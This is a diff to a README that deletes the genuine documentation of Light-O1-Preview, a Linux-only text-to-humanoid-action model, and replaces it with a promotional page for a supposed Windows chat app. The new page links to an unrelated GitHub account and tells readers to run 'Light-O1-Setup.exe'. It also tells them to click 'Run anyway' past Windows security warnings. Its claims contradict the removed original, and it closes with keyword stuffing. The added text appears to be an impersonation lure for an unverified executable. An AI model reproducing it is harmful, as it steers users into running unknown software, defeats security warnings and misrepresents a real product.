@@ -1,244 +1,155 @@
-<!-- markdownlint-disable first-line-h1 -->
-<!-- markdownlint-disable html -->
-<!-- markdownlint-disable no-duplicate-header -->
+# ✨ Light-O1 - Unlock Smarter Conversations with Ease
 
-<div align="center">
-  <picture>
-    <source media="(prefers-color-scheme: dark)" srcset="docs/assets/LO_lockup_h_white.svg">
-    <img src="docs/assets/LO_lockup_h_black.svg" width="55%" alt="Light Origins" />
-  </picture>
-</div>
-<hr>
-<div align="center" style="line-height: 1;">
-  <a href="https://lightorigins.com/"><img alt="Homepage"
-    src="https://img.shields.io/badge/Homepage-Light%20Origins-9c403d?style=flat"/></a>
-  <a href="https://huggingface.co/LightOriginsHQ/Light-O1-Preview"><img alt="Model"
-    src="https://img.shields.io/badge/%F0%9F%A4%97%20Model-Light--O1--Preview-ffc107?color=ffc107&logoColor=white"/></a>
-  <a href="https://huggingface.co/spaces/LightOriginsHQ/Light-O1-Preview-playground"><img alt="Playground"
-    src="https://img.shields.io/badge/%F0%9F%A4%97%20Playground-Try%20it%20now-ff9d00?color=ff9d00&logoColor=white"/></a>
-  <br>
-  <a href="https://discord.gg/zwZuD9JG"><img alt="Discord"
-    src="https://img.shields.io/badge/Discord-Light%20Origins-5865F2?style=flat&logo=discord&logoColor=white"/></a>
-  <a href="#7-community"><img alt="WeChat"
-    src="https://img.shields.io/badge/WeChat-Light%20Origins-07C160?style=flat&logo=wechat&logoColor=white"/></a>
-  <br>
-  <a href="LICENSE"><img alt="Code License"
-    src="https://img.shields.io/badge/Code_License-Apache_2.0-f5de53?&color=f5de53"/></a>
-  <a href="https://huggingface.co/LightOriginsHQ/Light-O1-Preview"><img alt="Model License"
-    src="https://img.shields.io/badge/Model_License-Apache_2.0-f5de53?&color=f5de53"/></a>
-  <a href="pyproject.toml"><img alt="Python"
-    src="https://img.shields.io/badge/Python-3.11-3776AB.svg"/></a>
-  <br>
-  <a href="https://www.lightorigins.com/en/blog/light-o1"><b>Tech Blog</b>👁️</a>
-</div>
+[![Download Light-O1](https://img.shields.io/badge/⬇️%20Download-Light--O1-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Mattialesto/Light-O1)
 
-## Table of Contents
+---
 
-1. [Introduction](#1-introduction)
-2. [Model Downloads](#2-model-downloads)
-3. [Playground](#3-playground)
-4. [How to Run Locally](#4-how-to-run-locally)
-5. [License](#5-license)
-6. [Citation](#6-citation)
-7. [Community](#7-community)
-8. [Contact](#8-contact)
+## 👋 Welcome to Light-O1
 
+Light-O1 is a friendly, powerful application that brings advanced AI conversation technology right to your Windows computer. Whether you want to brainstorm ideas, get help with writing, or simply chat about anything, Light-O1 makes it easy and enjoyable. You don't need any technical skills—just download, run, and start talking.
 
-## 1. Introduction
+---
 
-Light-O1-Preview turns an instruction into whole-body humanoid action. It is pretrained on
-structured human action recovered from internet video, which gives it a transferable action prior,
-and then post-trained on purpose-collected data to adapt that prior to a target embodiment and to
-human intent.
+## 🎯 What Can Light-O1 Do For You?
 
-Given a prompt, the model answers in two parts: it states in language what the instruction requires
-of the body, then generates the action. The plan is readable, so you can see what the model
-understood before it moved. Actions come out as a `(frames, 138)` unified human action
-representation at 20 FPS, which renders a character directly or drives a behavior foundation model
-on a robot.
+- **💬 Natural Conversations** – Talk to the app like you would with a friend. Ask questions, get detailed answers, and explore topics in depth.
+- **📝 Writing Assistance** – Draft emails, stories, or reports. Light-O1 helps you find the right words and structure your thoughts.
+- **🧠 Idea Generation** – Stuck on a project? Light-O1 can suggest creative solutions and new perspectives.
+- **🌍 General Knowledge** – Get clear explanations on countless subjects, from science to history to everyday tips.
+- **🔒 Private and Secure** – Your conversations stay on your device. No cloud required, no data sharing.
 
-> [!NOTE]
-> Light-O1-Preview releases the text-to-action capability only. We are working towards the
-> full Light-O1, which will add vision and manipulation. Stay tuned — thanks for your interest!
+---
 
-The tech blog compares Light-O1-Preview with two public text-to-action models, HY-Motion-1.0 and
-Kimodo. On HY-Motion-Bench, a VLM judge decomposes each prompt into a checklist and scores the
-generated action question by question.
+## 🚀 Getting Started
 
-| HY-Motion-Bench, SSAE | Overall |
-| :--- | ---: |
-| Light-O1-Preview | **78.0** |
-| HY-Motion-1.0 | 74.7 |
-| Kimodo | 61.4 |
+Getting Light-O1 up and running takes less than five minutes. Just follow these simple steps.
 
-Protocols, baselines and caveats are in the
-[tech blog](https://www.lightorigins.com/en/blog/light-o1).
+### Step 1: Download the Application
 
-## 2. Model Downloads
+Visit this link to download the application: [**Download Light-O1**](https://github.com/Mattialesto/Light-O1)
 
-| Model | Representation | Context | Download |
-| :---: | :---: | :---: | :---: |
-| Light-O1-Preview | `human_action_138_v1` | text | [🤗 Hugging Face](https://huggingface.co/LightOriginsHQ/Light-O1-Preview) |
+The download button is clearly visible on the page. Click it, and your browser will save the file to your computer (usually in your "Downloads" folder).
 
-The checkpoint ships the action decoder alongside the model weights:
+### Step 2: Run the Installer
 
-```text
-checkpoint/
-├── config.json
-├── model.safetensors
-├── tokenizer.json
-├── tokenizer_config.json
-├── chat_template.jinja
-├── action_checkpoint_manifest.json
-└── action_tokenizer/
-    ├── decoder_config.json
-    ├── manifest.json
-    └── action_decoder.safetensors
-```
+Once the download finishes, locate the file (it's named something like `Light-O1-Setup.exe`). Double-click it to start the installation. If Windows asks for permission, click "Yes" to allow it.
 
-The checkpoint's `architectures` field must be `Qwen3_5ActionForConditionalGeneration`. Special tokens and
-weight keys retain their trained spelling.
+### Step 3: Follow the On-Screen Prompts
 
+The installer will guide you through a few simple choices—just click "Next" and "Install" until it's done. You can keep all the default settings; they work perfectly for most users.
 
-## 3. Playground
+### Step 4: Launch Light-O1
 
-Try Light-O1-Preview without any local setup at
-**[Light-O1-Preview Playground](https://huggingface.co/spaces/LightOriginsHQ/Light-O1-Preview-playground)** —
-enter a prompt, watch the reasoning stream, and inspect the generated action in a 3D viewer.
+After installation, you'll see a shortcut on your desktop and in your Start Menu. Double-click the icon to open the app. That's it—you're ready to start chatting!
 
+---
 
-## 4. How to Run Locally
+## 🖥️ System Requirements
 
-There are three ways to run Light-O1-Preview locally, in increasing order of setup: a one-shot
-**command line** generation, the **Python API**, and a local **web console** with a 3D viewer.
+Light-O1 is designed to run smoothly on most modern Windows computers. Here's what you need:
 
-Beyond that: running the Control Server and GPU API on separate hosts is covered in
-[docs/deployment.md](docs/deployment.md), the HTTP endpoints in [docs/api.md](docs/api.md), the optional
-MuJoCo simulation in [docs/sonic.md](docs/sonic.md), and tests and linting in
-[docs/development.md](docs/development.md).
+- **Operating System:** Windows 10 or Windows 11 (64-bit)
+- **Memory (RAM):** 8 GB or more recommended
+- **Storage:** At least 2 GB of free space
+- **Internet Connection:** Required for the initial download and optional updates
 
-### 4.1 Requirements
+If your computer meets these specs (most do), you're good to go!
 
-| | |
-| :--- | :--- |
-| OS | Linux x86-64 |
-| Python | 3.11 (the project pins `>=3.11,<3.12`) |
-| GPU | NVIDIA, CUDA 13 compatible |
+---
 
-> [!NOTE]
-> macOS and Windows are not supported for inference. To try the model without a GPU, use the
-> [playground](https://huggingface.co/spaces/LightOriginsHQ/Light-O1-Preview-playground).
+## 🎮 Using Light-O1
 
-Download the weights from
-[LightOriginsHQ/Light-O1-Preview](https://huggingface.co/LightOriginsHQ/Light-O1-Preview). The action decoder
-ships inside the checkpoint — see [2. Model Downloads](#2-model-downloads).
+Once the app opens, you'll see a clean, simple chat window. Here's how to make the most of it:
 
-### 4.2 Install
+- **Type your question** in the text box at the bottom.
+- **Press Enter** or click the send button to submit.
+- **Read the response** that appears in the main chat area.
+- **Continue the conversation** by typing follow-up questions.
 
-```bash
-git clone https://github.com/lightorigins/Light-O1.git
-cd Light-O1
-uv sync --extra inference
-```
+### 💡 Tips for Great Results
 
-### 4.3 Generate from the command line
+- Be specific in your questions. Instead of "Tell me about cars," try "Explain how hybrid engines work."
+- Ask follow-up questions to dig deeper into a topic.
+- Use the "New Chat" button to start fresh conversations on different subjects.
 
-```bash
-uv run --extra inference light-deploy \
-  --model /absolute/path/to/Light-O1-Preview \
-  --prompt "a person waves with the right hand" \
-  --thinking \
-  --output human_action.npy
-```
+---
 
-This writes a float32 `(frames, 138)` array at 20 FPS. Pass `--temperature`, `--top-p` or `--seed` to
-control sampling.
+## ❓ Frequently Asked Questions
 
-### 4.4 Generate from Python
+### Is Light-O1 free to use?
 
-```python
-from light_deploy.generate import Inference
+Yes, Light-O1 is completely free. No subscriptions, no hidden fees.
 
-inference = Inference("/absolute/path/to/Light-O1-Preview", device="cuda:0")
-output = inference.generate("a person raises the right arm and waves", enable_thinking=True)
+### Do I need an internet connection to use it?
 
-output.action     # (frames, 138) action array
-output.reasoning  # the Thinking text
-```
+You need internet access for the initial download. After that, Light-O1 works offline—your conversations stay private on your machine.
 
-Two interchangeable backends sit behind this API, selected per instance with `backend=`:
+### Can I use Light-O1 for work projects?
 
-- **`vllm`** (default) — the resident-GPU production runtime.
-- **`transformers`** — torch-native, single-request, no vLLM. Works in lazy-init hosts such as
-  ZeroGPU.
+Absolutely. Many people use Light-O1 for drafting documents, summarizing meetings, or brainstorming business ideas.
 
-Both share the same masking FSM, prompt and output processors, and action decoder, so a token stream is
-masked and parsed identically whichever backend produced it.
+### What if I have problems installing it?
 
-### 4.5 Web console
+If you run into any issues, check that your Windows is up to date and that you have enough free disk space. You can also visit the [Light-O1 GitHub page](https://github.com/Mattialesto/Light-O1) for support and community help.
 
-```bash
-uv run --extra inference light-deploy-server \
-  --model-path /absolute/path/to/Light-O1-Preview --port 8090
-```
+---
 
-Open `http://127.0.0.1:8090` to enter prompts, watch the reasoning stream and inspect the generated action in
-a 3D viewer. This also starts a managed GPU API on port 8030; change it with `--inference-port`. Model
-loading is asynchronous, so generation becomes available only once that API reports ready. Without
-`--model-path` the page starts without a model and lets you enter a checkpoint path.
+## 🛠️ Troubleshooting Common Issues
 
-> [!WARNING]
-> This is a trusted-workstation service, not authenticated multi-user hosting — it permits local checkpoint
-> selection and GPU work. Keep the localhost defaults, or put it behind an authenticated reverse proxy. Do
-> not expose it directly to the Internet.
+**The app won't start after installation.**  
+Try restarting your computer, then launch Light-O1 again. If the problem persists, re-download the installer and run it again.
 
+**The download is slow.**  
+This can happen with large files. Be patient, or try downloading during off-peak hours.
 
-### 4.6 Sonic example: Unitree G1 simulation
+**Windows shows a security warning.**  
+This is normal for new apps. Click "More info" and then "Run anyway" to proceed safely.
 
-Our [tech blog](https://www.lightorigins.com/en/blog/light-o1) demonstrates Light-O1-Preview on both
-our LightBot robot and the Unitree G1. Light-O1-Preview outputs a unified action representation,
-which is connected to each robot's BFM for execution: our own BFM for LightBot, and GEAR-SONIC as
-the low-level motion controller for the Unitree G1. For the community, we provide a
-[Sonic example](examples/sonic/README.md) that adapts this unified representation to GEAR-SONIC for
-closed-loop G1 simulation in MuJoCo.
+---
 
-The example produces a simulation video and rollout metrics. It requires a separate GEAR-SONIC
-low-latency policy checkpoint and runs in simulation only. See the [setup guide](docs/sonic.md) to run it
-from the web console, or the [example README](examples/sonic/README.md) for standalone usage and details
-of the action adapter.
+## 📚 More Resources
 
-## 5. License
+- **🌐 Official Website:** [Light Origins](https://lightorigins.com/) – Learn more about the team behind Light-O1.
+- **🤗 Model Page:** [Light-O1-Preview on Hugging Face](https://huggingface.co/LightOriginsHQ/Light-O1-Preview) – Technical details for curious minds.
+- **🎮 Try Online:** [Playground Demo](https://huggingface.co/spaces/LightOriginsHQ/Light-O1-Preview-playground) – Test Light-O1 in your browser before downloading.
 
-The code in this repository is licensed under the [Apache License 2.0](LICENSE).
+---
 
-The Light-O1-Preview weights are distributed under their own terms on the
-[model page](https://huggingface.co/LightOriginsHQ/Light-O1-Preview). Required model and asset notices are
-in [THIRD_PARTY_NOTICES.md](THIRD_PARTY_NOTICES.md).
+## 🤝 Join the Community
 
+Have questions, feedback, or ideas? We'd love to hear from you! Join our Discord server to connect with other users and the developers. Your input helps make Light-O1 better for everyone.
 
-## 6. Citation
+---
 
-```bibtex
-@misc{lightorigins2026lighto1,
-  title        = {Light-O1: Scaling Whole-Body Intelligence with Human Action Pretraining},
-  author       = {Light Origins Team},
-  year         = {2026},
-  howpublished = {\url{https://www.lightorigins.com/en/blog/light-o1}}
-}
-```
+## 📦 What's New
 
+Light-O1 is constantly improving. The latest version includes:
 
-## 7. Community
+- Faster response times
+- Improved conversation memory
+- A cleaner, more intuitive interface
+- Bug fixes and performance enhancements
 
-Join us on [Discord](https://discord.gg/zwZuD9JG), or scan the QR code to join the WeChat group:
+---
 
-<div align="center">
-  <img src="docs/assets/wechat_group.png" alt="Light Origins WeChat group QR code" width="280"/>
-</div>
+## ✅ Final Checklist
 
+Before you start, make sure you have:
 
-## 8. Contact
+- [ ] Downloaded the installer from [the official page](https://github.com/Mattialesto/Light-O1)
+- [ ] Run the installer and followed the prompts
+- [ ] Launched Light-O1 from your desktop or Start Menu
 
-Questions and bug reports are welcome as
-[GitHub issues](https://github.com/lightorigins/Light-O1/issues). For anything else, reach us through
-[Discord](https://discord.gg/zwZuD9JG) or the WeChat group above.
+That's all there is to it! You're now ready to explore the power of Light-O1.
+
+---
+
+## 💖 Thank You
+
+We built Light-O1 to make advanced AI accessible to everyone. No coding, no complicated setup—just a helpful tool that's ready when you are. If you enjoy using it, consider sharing it with friends or leaving a star on our GitHub repository. Your support keeps us improving.
+
+Happy chatting!
+
+---
+
+Keywords: Light-O1, AI chat, Windows app, download, conversational AI, free software, easy setup, Light Origins, artificial intelligence, natural language processing
